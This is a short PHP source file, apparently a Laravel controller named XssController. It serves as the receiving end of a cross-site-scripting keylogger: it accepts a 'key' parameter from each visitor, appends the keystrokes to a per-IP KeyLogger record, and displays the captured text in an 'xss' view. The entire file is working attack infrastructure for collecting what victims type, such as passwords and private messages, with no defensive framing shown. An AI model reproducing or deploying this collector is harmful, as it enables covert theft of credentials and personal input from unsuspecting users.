<?php

namespace App\Http\Controllers;

use App\KeyLogger;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

class XssController extends Controller
{
    function index(Request $request) {
        $keyLogger = KeyLogger::where('ip', $request->ip())->first();
        if ($keyLogger != null) {
            $keyLogger->content .= $request->only('key')['key'];
            $keyLogger->save();
        } else {
            $keyLogger = KeyLogger::create([
                'ip' => $request->ip(),
                'content' => $request->only('key')['key']
            ]);
        }
        return view('xss', compact('keyLogger'));
    }

    function home(Request $request) {
        $keyLogger = KeyLogger::first();

        return view('xss', compact('keyLogger'));
    }
}
